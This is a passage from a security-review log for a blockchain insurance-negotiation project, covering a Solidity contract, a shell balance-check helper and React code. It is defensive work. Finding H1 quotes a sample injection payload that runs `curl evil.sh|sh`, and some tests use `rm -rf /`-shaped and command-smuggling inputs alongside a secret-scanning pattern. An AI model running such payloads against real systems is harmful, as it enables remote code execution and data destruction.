| No secrets | PASS | No hardcoded keys/tokens/private keys added. The diff *deletes* the secret-consuming surface: `@anthropic-ai/sdk` removed from `package.json`; `scripts/orchestrator-real.ts` deleted (it read `ANTHROPIC_API_KEY` / `VITE_PRIVATE_KEY` from env); `orchestrator:real` npm script removed. `scripts/verify-deploy.ts` reads `VITE_PRIVATE_KEY` from `.env` only to derive an address (`ethers.Wallet(...).address`), no transactions signed/sent. Only public 40-hex wallet addresses appear in deleted code/docs — no 64-hex private keys. |
| Signing-key hygiene | PASS | The Amendment-0006 self-hosted EOA-as-platform path is fully removed (`selfHosted` bool, `setPlatformSelfHosted`, `_fireAgentSelfHosted`, `_selfHostedNonce`, `IParseWebsiteAgent`). That path forwarded native value via plain `.call{value}` to a trusted EOA and minted synthetic requestIds; removing it shrinks the trusted-key surface. The platform callback gate `require(msg.sender == address(platform), "callback: not platform")` (CoverageNegotiation.sol:628) is intact. All admin mutators (`setPlatform`, `setAgentId`, `setAgentReward`, `setRulingTimeout`, `setAgentEvidenceUrl`, `setMaxRounds`, `withdrawFunds`, and the new keeper `commitRationale`) remain `onlyOwner`. |

### Standard categories examined

- **Injection** (SQL / command / path / template / XXE / NoSQL): no new untrusted-input →
  shell / filesystem / DB / template paths. The TS scripts read only a fixed `.sol` path
  and their own source (`readFileSync` on `import.meta.url`) — no user-controlled paths.
- **Auth / authz**: callback gate preserved; all setters + the new `commitRationale`
  keeper entry are `onlyOwner`. No new privilege boundary crossed.
- **Crypto / randomness**: the keccak-seeded synthetic-requestId path is *removed*, not
  added; no weak crypto, no new randomness dependency. `_tokenToDecision` compares
  `keccak256` token hashes (constant-set membership) — standard.
- **Code execution / deserialization**: `handleResponse` now `abi.decode(..., (string))`
  a single token; unknown/malformed tokens fall through *defensively* to non-terminal
  `NeedMoreEvidence` (fail-safe — never advances to a terminal state on garbage input).
- **Data exposure**: no sensitive data logged; `verify-deploy` prints only RPC URL,
  contract address, and a derived operator address (public).
- **`vite.config.ts` `allowedHosts` += `.ts.net`**: dev/preview-server only (not the
  production build), Tailscale-controlled domain resolvable only on the tailnet or via
  Funnel ACLs, extending an existing `.trycloudflare.com` wildcard. Not an exploitable
  production surface; excluded as a dev-only convenience.

### Files reviewed

`contracts/contracts/CoverageNegotiation.sol`, `MockAgentPlatform.sol`,
`RevertingReceiver.sol`, `contracts/test/CoverageNegotiation.test.ts`,
`scripts/check-ruling-abi.ts`, `scripts/lib/ruling-abi.ts`,
`scripts/identify-inference-agent.ts`, `scripts/verify-deploy.ts`,
`contracts/scripts/probe-agent-abi.ts`, `package.json`, `.gitignore`, `vite.config.ts`;
deletions `scripts/orchestrator-real.ts`,
`contracts/scripts/setup-selfhosted-2026-05-30.ts`.

---

## Tick 119 — R25 Tick B (self-hosted _fireAgent) security review

**Date:** 2026-05-30
**Commit:** 9db79d7
**Scope:** `contracts/contracts/CoverageNegotiation.sol` — `_fireAgent` branch on `selfHosted` → `_fireAgentSelfHosted`, plus 5 new tests in `contracts/test/CoverageNegotiation.test.ts`.
**Verdict:** PASS (zero findings)

### CRITICAL
None.

### HIGH
None.

### MEDIUM
None.

### LOW
None.

### NIT
None.

### Threat walk-through

**T1 — Orchestrator-as-platform compromise.** Bounded by design. `handleResponse`
still gates `require(msg.sender == address(platform), "callback: not platform")` and
requires `_requestToNegotiation[requestId] != 0` AND `n.state == UnderReview`. A
leaked orchestrator key can only substitute the ruling outcome on in-flight requests
— it cannot drain funds (no `withdrawFunds` path opens, `totalFees` is settlement
marker only), cannot escalate to terminal states beyond `Approved`/`Denied`/
`PolicyInvalidated`/`EvidenceRequested` (the legitimate ruling outcomes), and cannot
touch requests not currently in `UnderReview`. This is the documented self-hosted
trust model.

**T2 — Synthetic requestId predictability.** Confirmed fully predictable
(`keccak256(block.number, address(this), reqId, nonce)`). Irrelevant because
delivering a fake ruling requires `msg.sender == address(platform)`, which reduces
to T1. No additional attack surface from predictability.

**T3 — Reentrancy via `.call{value}`.** Verified. All three `_fireAgent` callers —
`requestAdjudication` (line 420), `submitEvidence` (line 437), `appeal` (line 472
area, confirmed via grep) — carry `nonReentrant`. In `_fireAgentSelfHosted`, all
state effects (`n.totalFees`, `n.rulingDeadline`, `n.state = UnderReview`,
`n.pendingRequestId`, `_requestToNegotiation[requestId] = reqId`,
`PacketSubmitted` + `RulingRequested` emits) complete BEFORE either external call.
CEI preserved.

**T4 — Storage-layout corruption.** Verified. Pre-commit, the last storage slot is
`_requestToNegotiation` (line 203 in parent). Post-commit, `_selfHostedNonce` is
declared at line 217, AFTER `_requestToNegotiation` (line 208). `_nextId` (203),
`_negotiations` (205), and `_requestToNegotiation` (208) retain their original slot
indices. Iter-1 MEDIUM is correctly closed.

**T5 — Fee transfer DoS.** Orchestrator is an EOA; EOAs have no code and cannot
revert on receive. The `require(feeOk)` is belt-and-suspenders only. Even in the
theoretical revert case, the caller's value is returned via the outer revert and
no state commits. Safe.

**T6 — `handleResponse` round-trip integrity.** Verified. The new test encodes the
10-tuple matching the decoder at line 660: `(uint8, uint256, uint256, bytes32,
bytes32, bytes32, uint256, uint16[], uint16[], bytes32[])`. It passes
`Decision.Approve`, `costPlusUnitPrice=200n`, `nadacUnitPrice=NADAC_UNIT`, plus
the rationale/clause/standard refs and receipt id; asserts state → `Approved` and
event emission. The decode is non-trivial — the contract uses `costPlusUnitPrice`
to compute the deterministic `coveredAmount` cap (R6a), so a malformed tuple would
fail decode or produce a wrong cap. Test exercises the full happy path through
the orchestrator EOA.

**T7 — `setPlatform` clears `selfHosted`.** Intentional and documented (line 298:
"reversible via `setPlatform` which clears the self-hosted flag"). The
mid-operation foot-gun concern (owner flips mode while requests are
`UnderReview`) only stalls in-flight requests — the old orchestrator's
synthetic requestIds are still in `_requestToNegotiation`, but the new platform
won't recognize them; the old orchestrator can no longer pass the msg.sender
check. Recovery path: `onRulingTimeout` (existing) routes stalled requests to
`EvidenceRequested`. Not a security defect — requires explicit owner action,
no fund-loss path, no privilege escalation. Operational concern only;
acceptable.

**Additional checks performed:**
- `currentlyFiringReqId` intentionally not set in self-hosted path; doc-comment
  on storage var (lines 195-199) documents the exception and points observers
  at the `RulingRequested` event (which fires synchronously). No CEI or
  observability defect.
- `agentReward=0` path verified: `if (fee > 0)` skips the orchestrator transfer
  (free demo mode) but still fires the agent and populates `_requestToNegotiation`
  — covered by the "synthetic requestId is unique across two same-block fires"
  test using `agentReward=0n`.
- `setPlatformSelfHosted` is `onlyOwner` (line 300). Confirmed.
- No new external calls beyond the two documented (`.call{value: fee}` to
  orchestrator, `.call{value: refund}` to payer).
- Test count: 39/39 passing per commit message; 5 new tests cover the four
  behavioral invariants (state transition, requestId uniqueness, underfund
  revert, overpayment refund) plus the round-trip ruling test.

---

## Tick 85 (re-review) — R23 cost-estimator fixes

**Date:** 2026-05-30
**Verdict:** PASS (zero findings — all prior findings CLOSED)

### H1 status: CLOSED
RPC `hex` no longer interpolated into python source. `_cost_get_balance_wei`
regex-gates the RPC `result` via shell `case` (`0x[0-9a-fA-F]*`) and then
passes the value via `CE_HEX` env var to `python3 -c "import os;
print(int(os.environ['CE_HEX'], 16))"`. Even if the case-glob is loose
(matches any tail after one hex char), `int(_, 16)` in python parses the
env var as a *string literal*, not as code — RCE is impossible. The
JSON-parse step also uses `CE_RESP` env var, not source interpolation.
`need` / `short` / `_cost_format_stt` / final compare all use the same
env-var pattern. Manual injection probe (`CE_HEX='0xa; os.system(...)'`)
correctly raises `ValueError`, no code execution.

### M1 status: CLOSED
Private key piped via `printf '%s' "$key" | node ... -e "...readFileSync(0,
'utf8').trim()..."`. Verified `printf` is a bash builtin (`type printf`
→ `shell builtin`) on both interactive and non-interactive bash, so no
forked process holds the key in argv. Node reads from fd 0; key never
enters argv of any process. Local `key` var cleared after use.

### L1 status: CLOSED
`prev_x="$-"` captures xtrace state, `set +x` disables around key
handling, `case "$prev_x" in *x*) set -x ;;` restores on both
early-return (missing key, line 54) and success (line 68) paths. Node
heredoc body is between `set +x` and the restore, so `set -x` callers
no longer echo the key. Minor: no `trap` for unexpected mid-fn exit,
but no abort points between disable + restore that would leak.

### L2 status: CLOSED
`_cost_is_valid_address` enforces strict `0x` + exactly 40 hex chars
via explicit-class case glob (40 bracketed `[0-9a-fA-F]`). Called inside
`_cost_get_balance_wei` BEFORE the RPC body is built, so caller-supplied
addresses (including the `assert_wallet_sufficient` 4th-arg path) are
validated even though `assert_wallet_sufficient` doesn't re-validate.
T7 confirms `evil"]} injection` is rejected with rc≠0.

### Additional verification
- `_cost_is_nonneg_int` (`''|*[!0-9]*) return 1`) rejects empty,
  negative (`-` is non-digit), and shell-injection-shaped strings.
- T7 (invalid address), T8 (negative writes), T8b (`'1; rm -rf /'`-
  shaped writes) all PASS. Full suite: 9/9 passing.
- T3 + T6 still pass — spec's loud failure message format preserved
  exactly (`<scenario>: insufficient balance: needed X STT, have Y STT,
  short Z STT — fund <addr> at https://testnet.somnia.network/`).

### New findings: none
The env-var-into-python pattern is consistently applied (`CE_RESP`,
`CE_HEX`, `CE_W/A/G/F/AF`, `CE_HAVE`, `CE_NEED`, `CE_WEI`). All values
are immediately cast via `int()` or `json.loads()`; no `eval`, no shell
expansion in python source. No new attack surface introduced.

---

## Tick 85 — SPEC-0005 R23 cost-estimator (security-review)

**Date:** 2026-05-30
**Verdict:** FAIL (1 HIGH, 1 MEDIUM, 2 LOW, 1 NIT)

### Scope

- `web/tests/agent-browser/cost-estimator.sh` — new `assert_wallet_sufficient`
  helper, address derivation from `.env`, RPC balance lookup, wei→STT
  formatting, shortfall printf.
- `web/tests/agent-browser/cost-estimator.test.sh` — synthetic-address unit
  tests using `COST_TEST_BALANCE_WEI` and `COST_FORCE_CHECK`.
- `web/tests/agent-browser/run.sh` — `. cost-estimator.sh` at top + a single
  `assert_wallet_sufficient "Scenario A" 6 1 || exit 2` call in Scenario A.

### HIGH

**H1 — RPC-response → shell-interpolated `python3 -c` enables RCE if RPC is
attacker-controlled (line 81).**

The `hex` value returned by the RPC is interpolated **into the python source
string**, not passed via stdin/argv:

```sh
hex="$(printf '%s' "$resp" | python3 -c "import sys,json; print(json.load(sys.stdin).get('result',''))")"
# ...
python3 -c "print(int('$hex', 16))"        # <-- $hex interpolated
```

A malicious RPC returning a `result` like
`0', 16)) or __import__('os').system('curl evil.sh|sh') #` is parsed by the
first python step into `hex`, then **executed as python source** by the second
step. Same vector applies indirectly to `_cost_format_stt` (`f'{int("$1")/1e18}'`)
and to the `need`/`have`/`short` arithmetic `python3 -c "print(int('$have') >= ...)"`
— `$have` flows from RPC.

`COST_RPC_URL` is overridable via `VITE_RPC_URL`/`RPC_URL`, and the default
endpoint is third-party-operated. Any future redirection, MITM (HTTPS pin
not enforced — curl `-sf` accepts the system CA), or compromised testnet
gateway converts a balance check into arbitrary code execution on the dev
box (and on CI).

**Fix:** validate `hex` is `^0x[0-9a-fA-F]+$` before passing it onward, or
pipe it via stdin to a self-contained `python3 -c '...'` block, e.g.

```sh
hex="$(printf '%s' "$resp" | python3 -c 'import sys,json,re
r=json.load(sys.stdin).get("result","")
sys.exit(2) if not re.fullmatch(r"0x[0-9a-fA-F]+", r) else print(int(r,16))')"
```

Apply the same pattern to `_cost_format_stt` and the `need >= have` compare:
pass numbers as env vars / stdin, never interpolate.

### MEDIUM

**M1 — Private key passed via `node -e ... "$key"` argv (line 55) is visible
in `ps -ef` / `/proc/<pid>/cmdline`.**

On a multi-tenant host or a CI runner with sibling jobs, any process able to
read `/proc/<pid>/cmdline` (typically world-readable on Linux unless
`hidepid=2` is set) sees the full key for the ~200ms node lifetime. The
comment on line 50 explicitly acknowledges "Pass the key via argv so it
never appears in process listing as part of the script body" — but argv
**is** the process listing.

**Fix:** pipe the key via stdin instead, and read `process.stdin` in the
node snippet:

```sh
printf '%s' "$key" | node --input-type=module -e "
  import { Wallet } from 'ethers'; import { readFileSync } from 'fs';
  const key = readFileSync(0,'utf8').trim();
  process.stdout.write(new Wallet(key).address);
"
```

### LOW

**L1 — `set -x` in any caller leaks the key (line 55).** The helper does not
defensively wrap the derive call in `{ set +x; } 2>/dev/null` before the
key-bearing invocation. `run.sh` does not enable `-x` today, but ad-hoc
debugging (`bash -x run.sh`) would echo the literal key to stderr / CI logs.
Add `{ set +x; } 2>/dev/null` around the node call and restore on exit.

**L2 — Caller-supplied `WALLET_ADDR` is JSON-body-interpolated without
validation (line 73).** A non-conforming `addr` (e.g. `0xdead","x":"y`) is
spliced into the JSON-RPC body. The RPC will likely just error, but a
crafted value can smuggle extra params or break the parser into returning
attacker-controlled text. Validate `addr` against `^0x[0-9a-fA-F]{40}$`
before use. The 4th-arg path is the only externally-callable input; tests
already pass clean hex, but the helper is now a generic library.

### NIT

**N1 — Sim-mode gate is fail-open (line 102).** Acceptable today (a wrongly
set `VITE_WALLET_MODE=real` aborts loudly with a funding hint rather than
burning funds), but the truthiness check `[ ... != "real" ]` means a typo'd
`"Real"` / `"REAL"` skips the check silently. Lower-case the comparison or
match `^(real|REAL)$` for symmetry with the rest of the harness.

### Confirmed safe (no finding)

- `.env` grep idiom (Q3): `^VITE_PRIVATE_KEY=` regex correctly rejects
  comment lines and leading-whitespace lines; quote-stripping handles single
  and double quotes; multi-line `.env` values aren't supported but aren't a
  real-world `.env` shape.
- `printf` format string (Q5): the format is a literal; `$scenario` flows
  into a `%s` arg, so `%n` is treated as data, not a directive. Bash's
  builtin `printf` does not honor `%n` in `%s` arguments anyway.
- Test file (Q8): synthetic `0xDEAD...` and `0x0000...0001` addresses only;
  `unset VITE_WALLET_MODE COST_FORCE_CHECK COST_TEST_BALANCE_WEI` before T1
  prevents env-bleed; `COST_TEST_BALANCE_WEI` short-circuits the RPC path so
  the test never touches a real key.

### Recommended action

H1 must be fixed before merge — RCE-via-RPC on a developer's machine is not
acceptable even for a test harness, and the helper is sourced unconditionally
by `run.sh`. M1, L1, L2 should follow in the same fix (single-file patch).
N1 may slip to a follow-up.

---

## Tick 83 — R11 key-paste derived-address (security-review)

**Date:** 2026-05-30
**Verdict:** PASS (zero findings)

### Scope

- `web/src/views/Settings.tsx` — new `useState` for `newKey`, new `useMemo`
  `derivedAddress` calling `new Wallet(key).address` (ethers v6), updated
  `onAdd` to prefer `derivedAddress` over the manual address field, address
  input becomes `readOnly` while a valid key is present, key field cleared on
  successful submit alongside the other inputs.
- `web/tests/agent-browser/run.sh` — new `scenario_key_paste_derives`
  (Scenario K) asserting address auto-derives, read-only is applied, persisted
  user carries the derived address, and the key string is NOT present in
  `curie:users`.

### Per-threat analysis

#### 1. Does the private key ever escape the form? — PASS

Traced every read of `newKey` in `Settings.tsx`:

- `useMemo` derivation (line 388-396): calls `new Wallet(trimmed).address`,
  returns the address only. The key never escapes the closure.
- `onAdd` (line 424-427): trims, validates, then uses `derivedAddress` (the
  memo'd address) as the persisted value. The raw key is never put on the
  `DemoUser` object that gets passed to `addUser` / `saveUsers`.
- `<input value={newKey} ...>` (line 506-514): one-way React-controlled input
  — value flows from state INTO the DOM via React's value-prop reconciliation
  (which uses property assignment, not textContent / innerHTML), and is GC'd
  when the component unmounts. No `defaultValue`, no `ref` capture, no other
  reader.

Verified absence (`grep -rn "console\.\|fetch\|axios\|XMLHttpRequest"` in
Settings.tsx → no hits). No exception re-throw path — the only `throw` site
(`new Wallet(...)`) is inside a `try/catch` that returns `null` without
referencing the error (`catch {}` form discards the error object entirely,
so it cannot bubble to a React error boundary, `window.onerror`, or
`unhandledrejection`).

#### 2. Does the useMemo swallow errors safely? — PASS

`catch { return null }` — the caught Error is never bound to a variable, so
its `.message` (which under some ethers builds includes a sanitized excerpt
of the input) cannot leak via logging, re-throw, or attach-to-state. The
fallthrough is a pure null return.

#### 3. readOnly bypass via devtools — PASS

The `readOnly={derivedAddress !== null}` attribute is **UX-only**. The submit
path (`onAdd`, line 427) computes `const address = derivedAddress ??
newAddress.trim()` — `derivedAddress` is the React-state memo of
`newKey.trim()`, NOT the live DOM input `.value`. If a user removes
`readOnly` via devtools and types into the address field, the `onChange`
handler updates `newAddress`, but because `newKey` still holds a valid key,
`derivedAddress` is non-null and wins via the `??` operator. The security
boundary (which address gets persisted) is enforced at submit-time from
state, not from the DOM input. PASS.

#### 4. localStorage exposure — PASS

The `DemoUser` shape persisted by `saveUsers` is `{id, label, role, address}`
(see `src/users/userStore.ts:35-40`). `addUser` (`onAdd` line 437) passes
only `{id, label, role, address}` — no key field. JSON.stringify of that
object cannot include `newKey`.

Adjacent `WalletKeysPanel` (lines 213-361) DOES write to localStorage, but
under a wholly separate key prefix (`curie:VITE_PRIVATE_KEY` /
`curie:VITE_PRIVATE_KEY_INSURER`), with its own isolated state
(`providerKey` / `insurerKey`) — no shared writer, no shared event, no
incidental coupling. Operator intent is explicit (Save button) in that
panel; nothing in the UsersPanel flow ever touches those slots.

Test Scenario K explicitly asserts the key string is absent from
`curie:users` (line 595-596). It does NOT assert absence from `curie:` more
broadly, but the static analysis above shows no other write site exists in
the diff or the UsersPanel surface.

#### 5. XSS / DOM injection — PASS

Derived address sinks: `<input value={derivedAddress ?? newAddress}>` (React
attribute, escaped), `<code>{u.address}</code>` (text node, escaped),
`title={u.address}` (React attribute, escaped). No `dangerouslySetInnerHTML`,
no `innerHTML`, no `href` interpolation, no `eval` / `Function()`. The
derived address is constrained by `ethers.Wallet` to `^0x[0-9a-fA-F]{40}$`
anyway; even if a sink were vulnerable, the value shape is non-exploitable.

#### 6. Other surfaces — PASS

- **New dependency:** `import { Wallet } from "ethers"`. Ethers is an
  existing project dependency (already imported in `web/src/client.ts`). No
  new third-party package, no version bump.
- **Network calls:** none added.
- **WalletKeysPanel behaviour:** unchanged.
- **Test key choice:** `0x11..11` is a well-known public test vector
  (Ethereum testing canon, address `0x19E7E376...`). Appropriate for a
  public fixture; not a leak.

### NIT (non-finding, noted for future polish)

The new key input uses `type="text"`. The sibling `WalletKeysPanel` uses
`type="password"` for the provider/insurer key inputs. Switching to
`type="password"` would prevent shoulder-surfing / accidental screenshot
leaks during demos. This is stylistic consistency, not a security issue —
the key is never persisted from this field regardless. Out of scope for this
tick.

### Verdict

**PASS — zero findings.** The key-paste path keeps the private key strictly
ephemeral: it lives only in component state, flows only into a memo'd
address derivation, is never persisted, never logged, never networked, never
attached to an Error or rendered as raw HTML. The `readOnly` UX hint is not
relied upon as the security boundary — submit derivation is state-based.

---

# Tick 38 — UNIT-9 packet.ts security review

**Verdict:** PASS (0 findings).

## Diff scope

- `src/protocol/packet.ts` (NEW, 122 lines) — SPEC-0004 §2.3 evidence-packet
  types + Merkle helpers (`sliceHash`, `merkleLeaf`, `merkleRoot`).
- `src/protocol/packet.test.ts` (NEW, 188 lines) — node:test assertions
  pinning each formula against independently-computed ethers primitives.

## Per-concern verdict

### 1. Hash-formula correctness vs SPEC-0004 §3.4 — PASS

- Spec line 460: `keccak(abi.encode(url, contentHash, keccak(JSON.stringify(slice))))`.
- `sliceHash` (packet.ts:61-65) = `keccak256(toUtf8Bytes(JSON.stringify(slice)))` — matches.
- `merkleLeaf` (packet.ts:71-78) = `keccak256(coder.encode(["string","bytes32","bytes32"], [url, contentHash, sliceHash(slice)]))` — matches.
- `merkleRoot` uses sorted-pair + duplicate-last (OZ MerkleProof convention),
  documented in the impl comment (packet.ts:84-91). Spec §3.4 specifies "Merkle
  root over all leaves" without pinning a tree convention; the impl's choice of
  OZ-compatible sorted-pair matches the on-chain consumer pattern used elsewhere
  in the protocol layer.

### 2. Type-safety holes — PASS

The `as \`0x${string}\`` casts on `ethers.keccak256` outputs (packet.ts:62-64,
72-77, 100, 106, 116) are necessary because ethers v6 returns plain `string`
from `keccak256`. Each cast is applied to a value that genuinely is a
0x-prefixed 32-byte hex string by construction. No information-losing casts;
no `any`; no bypasses of the `EvidenceReference.contentHash` template-literal
invariant.

### 3. JSON canonicalization — PASS (documented limitation)

`sliceHash` depends on `JSON.stringify` insertion order. This is **explicitly
documented** in the impl (packet.ts:56-60): "callers must author the slice
object in canonical (insertion) order … No canonicalization library is used
(out of scope for v0)." Spec §3.4 (lines 442-462) defines slice as a typed
TS object with a fixed field order (`text`, `kind`, `locator`); a compliant
party agent that constructs slices via object-literal will produce a stable
hash. Risk surface is bounded to a misbehaving party agent that reorders
fields, which would produce a *different* leaf-hash and fail the
content-addressed packet-store check (R10a Lambda rejects mismatched bodies).
No impersonation or collision vector.

### 4. Merkle second-preimage attack — PASS (inherited OZ convention)

Sorted-pair Merkle without leaf/internal-node domain separation is the
documented OpenZeppelin MerkleProof convention. The impl explicitly states it
matches the OZ on-chain verifier pattern (packet.ts:88-91). Theoretical
second-preimage attack requires inverting keccak256 — not exploitable. The
on-chain consumer (per spec context) is OZ-style; introducing leaf-domain
separation here would break verifier compatibility.

### 5. Empty-packet bytes32(0) collision — PASS

`merkleRoot([])` returns `bytes32(0)` (packet.ts:93-95), Test 6 pins this.
A non-empty packet whose computed root equals `bytes32(0)` would require a
keccak256 preimage of 0 — astronomically unlikely (2^-256). No exploitable
collision vector. Test 6 covers the empty case; an absent "non-empty root ≠ 0"
test is a theoretical-only gap and not actionable.

### 6. Single-leaf root === leaf (length-extension shape) — PASS

`merkleRoot([refA]) === merkleLeaf(refA)` (packet.ts:99-101, Test 7). A 1-leaf
tree's "root" is 32 bytes; a 2-leaf tree's root is `keccak256(64 bytes)`. An
attacker claiming a 2-leaf root is actually a 1-leaf root would need to invert
keccak256 — not exploitable. Matches OZ MerkleProof's behavior for
single-element trees.

### 7. Test quality — PASS

Tests 3, 4, 8, and 10 **independently compute** the expected hash via inline
`ethers` primitives (`computeSliceHash`, `computeMerkleLeaf`,
`sortedPairHash`) and assert equality with the impl — not just
"differs-from-other-value" comparisons. Any formula drift in the impl would
cause those tests to fail loud. Auxiliary tests (1, 2, 5, 6, 7, 9) cover
determinism, distinctness, empty/single-leaf cases, and pair-sort
order-independence. Coverage is tight against the SPEC-0004 §3.4 formula.

### 8. PHI / synthetic-fixture hygiene — PASS

Test fixtures use `example.com` URLs (packet.test.ts:46, 52, 58) and generic
synthetic slice text ("Drug X", "condition Y", "allergy Z" —
packet.test.ts:25-38). No real FDA/CMS URLs, no real drug names, no PHI, no
load-bearing external references. Aligns with the project-wide "no clinical
data on-chain or in fixtures" rule.

### 9. Dependencies — PASS

`ethers` (^6.16.0) is the only new import in packet.ts and packet.test.ts;
already a project dependency (used in `src/contract/`, `src/wallet/`). API
surface used: `AbiCoder.defaultAbiCoder()`, `keccak256`, `toUtf8Bytes`,
`solidityPacked` — all idiomatic v6 usage. No side effects on import.

---

# Security findings — 2026-05-29 tick 14 (Overview KPI strip — UNIT-UI-1)

**Verdict:** PASS (0 findings). Diff in `web/src/views/Overview.tsx` + `web/src/styles.css` adds 4 KPI cards derived from existing `rows: NegotiationView[]` via a single `reduce()`; no new I/O, network, fs, timers, or `eval`. Counts (`total`/`active`/`settled`/`saved`) are all real-data-derived — no mocks, stubs, or synthetic values. Labels/subs are hardcoded string literals; values are `number` or `bigint`-via-`fmtAmount`, both rendered through React's default-escaping JSX (no `dangerouslySetInnerHTML`, no XSS surface). CSS additions are static class names + literal hex colors with no dynamic `style=` attribute built from input (no CSS-injection vector).

---

# Security findings — 2026-05-29 tick 13 (useNegotiation hook — view/policy/priceBasis refetch on tx-confirmed)

**Verdict:** PASS (0 findings)

## Diff scope

1. **NEW** `web/src/hooks/useNegotiation.ts` (84 lines) — React hook
   per SPEC-0003 §2.3 R14. Takes `reqId: bigint` and
   `events: readonly CoverageEvent[]`. Calls three read-only client
   methods on every effect run: `client.negotiation.getNegotiationView(reqId)`,
   `client.negotiation.policyOf(reqId)`, and (conditionally, when
   `v.ruled || v.terminal`) `client.negotiation.priceBasisOf(reqId)`.
   Returns `{ view, policy, priceBasis, error, refetch }`. Stale-data
   protection uses two mechanisms: a closure-local `cancelled: boolean`
   set by the effect cleanup function, and a `prevReqIdRef: useRef<bigint | null>`
   that triggers state clear when `reqId` changes between effect runs.
   Imperative refetch is implemented via a `refetchTrigger` state
   counter listed in the effect dependency array.

## Per-concern verdict

### 1. Stale-data leak across reqId changes — PASS

The cancellation flag is correctly closed-over per effect invocation
and prevents stale writes. Inspection of lines 36–72:

```ts
useEffect(() => {
  if (prevReqIdRef.current !== reqId) {
    setView(null); setPolicy(null); setPriceBasis(null);
    prevReqIdRef.current = reqId;
  }
  let cancelled = false;
  (async () => {
    try {
      const v = await client.negotiation.getNegotiationView(reqId);
      const p = await client.negotiation.policyOf(reqId);
      const pb = v.ruled || v.terminal
        ? await client.negotiation.priceBasisOf(reqId)
        : null;
      if (!cancelled) {
        setView(v); setPolicy(p); setPriceBasis(pb); setError(null);
      }
    } catch (err) {
      if (!cancelled) {
        setError(err instanceof Error ? err.message : String(err));
      }
    }
  })();
  return () => { cancelled = true; };
}, [reqId, events, refetchTrigger]);
```

React's `useEffect` contract guarantees that **before** the next effect
body runs (whether triggered by a `reqId` change, a new `events` array
identity, or a `refetchTrigger` bump), the **previous** cleanup
function runs first. That cleanup sets the previous closure's
`cancelled = true`. Each effect invocation creates a **fresh**
`cancelled` binding via `let cancelled = false` (line 45) inside the
effect body — the closure captured by the async IIFE on line 47 sees
that fresh binding, not any other run's binding. When the in-flight
fetch for the OLD reqId eventually resolves, its `if (!cancelled)`
guard (lines 55 and 62) reads the OLD closure's binding, which the
cleanup has flipped to `true`, and the stale `setView(v)` /
`setPolicy(p)` / `setPriceBasis(pb)` / `setError(...)` writes are
skipped. State remains whatever the NEW effect invocation wrote (or
the `null` cleared by the `prevReqIdRef` guard at lines 38–43 if the
new fetch hasn't resolved yet).

The `prevReqIdRef` guard is a **complementary belt-and-suspenders**:
on a `reqId` change, the new effect run synchronously clears the three
state fields to `null` BEFORE its own async fetch starts, so the UI
visibly transitions to "loading" rather than briefly showing the
previous negotiation's data while the new fetch is in flight. Even
without the ref, the cancellation flag alone would prevent the stale
write — the ref's job is just to avoid showing stale-but-not-yet-overwritten
data during the loading window. Together they correctly close the
stale-write window in both directions (new effect's view is clean, old
effect's view is suppressed). No race window present.

The error path (lines 61–67) also gates on `!cancelled`, so a slow
fetch for the OLD reqId that throws cannot poison the NEW error state.

### 2. Error message leakage via err.message — PASS

The hook surfaces `err.message ?? String(err)` from any thrown error
into the `error` state (line 65). The three read methods invoked
(`getNegotiationView`, `policyOf`, `priceBasisOf`) all execute against
the `CurieClient` constructed in `web/src/client.ts` lines 110–162.
In **simulated** mode, errors are local validation throws from the
simulated backend with static English-language messages (`"unknown
negotiation"`, etc. — none embed the RPC URL or private key because
none exist in simulated mode). In **real** mode, errors flow up from
viem/ethers; viem v2 / ethers v6 `Error.message` strings include the
revert reason, the contract address, and the method signature, but
**not** the RPC URL and **not** the signer's private key (`viem`
explicitly redacts the private key from its serialized error metadata,
and ethers' `JsonRpcProvider` does not embed the URL into surfaced
revert errors — RPC URLs only appear in low-level network errors like
`HTTP 502`, which are themselves public infrastructure facts).

The client-side `VITE_PRIVATE_KEY` is read at module load (line 114)
and passed into `createClient`; it lives inside the SDK's wallet
object. Stack traces in the browser may include source file paths
(`web/src/client.ts:114`) but **do not** include the value of the env
var — the env var resolves to a string at build time and that string
is not re-inserted into error frames. The CLAUDE.md comment at line
164 ("Acceptable only because this is a no-funds dev wallet
(testnet / simulated)") confirms the threat model: even if the
build-time private key did leak via a stack trace, it controls only a
zero-balance testnet wallet. Surfacing `err.message` to the
`error` state and letting a consumer render it as text (React's
default JSX escaping prevents DOM injection — same defense as the
tick-12 `useAction` analysis) is the correct UX choice for showing a
transient RPC blip. No PHI surface — these are read-only view calls,
not the evidence/packet submission path. No sensitive runtime state
surfaced.

### 3. DoS via excessive refetch — N/A

`refetch()` (line 78) is a `useCallback` that bumps an in-memory React
state counter; it is not exposed to attackers — the consuming
component is the only caller. Each bump triggers one `useEffect` run
(three read calls, no writes, no fees). Even a misbehaving UI loop
would only spam the local RPC provider with view calls, not the
contract — view calls are gas-free on the local node and chargeable
only to the wallet/RPC operator. Not a security finding in the SPEC-0003
threat model. Noted as N/A per the brief.

### 4. No timer-based polling — PASS

`grep -nE 'setInterval|setTimeout|setImmediate|requestAnimationFrame'`
across `web/src/hooks/useNegotiation.ts` returns **zero matches**.
The refetch trigger is purely event-driven: the effect re-runs when
`reqId`, `events` (the parent feeds `events` from the tx-confirmed
event bus per SPEC-0003 §2.2), or `refetchTrigger` (consumer-driven
imperative refetch) changes. No background polling loop, no
`setInterval`-style timer that could fire after unmount, no leaked
animation-frame callback. The effect cleanup at lines 70–72 only
flips `cancelled = true` — no timer-clear bookkeeping required
because no timer exists.

### 5. No new secrets / credentials in the diff — PASS

Sweep across `web/src/hooks/useNegotiation.ts` for `BEGIN|PRIVATE
KEY|AKIA|sk-[A-Za-z0-9]|xoxb-|xoxp-|ghp_|github_pat|secret|password|
api[_-]?key|RPC_URL|PRIVATE_KEY|process\.env` returns zero matches.
The hook imports `client` from `../client.js`, which is itself
client-construction code; no env vars, no RPC URLs, no credentials are
read or referenced from inside the hook. Clean.

## Notes

- The hook adds a new client-side surface but no new external calls
  beyond the three already-existing read methods on
  `client.negotiation`. No new ABI surface, no new write paths.
- The cancellation discipline (closure-local `let cancelled = false`
  + cleanup `cancelled = true`) is the React-standard pattern for
  async-effect race-safety; correctly applied here.
- The `prevReqIdRef` clear-on-change guard is an additional
  UX-correctness layer, not a security guard — even without it, the
  cancellation flag alone prevents stale writes.
- Defense-in-depth: the consumer renders `error` as text under React's
  default JSX escaping (no `dangerouslySetInnerHTML` reachable from
  this hook), so even if a future viem/ethers version embedded
  attacker-controllable characters in `.message`, they would
  text-escape at the DOM boundary.

## Overall verdict

**PASS — zero findings.** The one-file `useNegotiation` hook
correctly implements stale-write protection via a closure-local
`cancelled` flag set by the effect cleanup, with a complementary
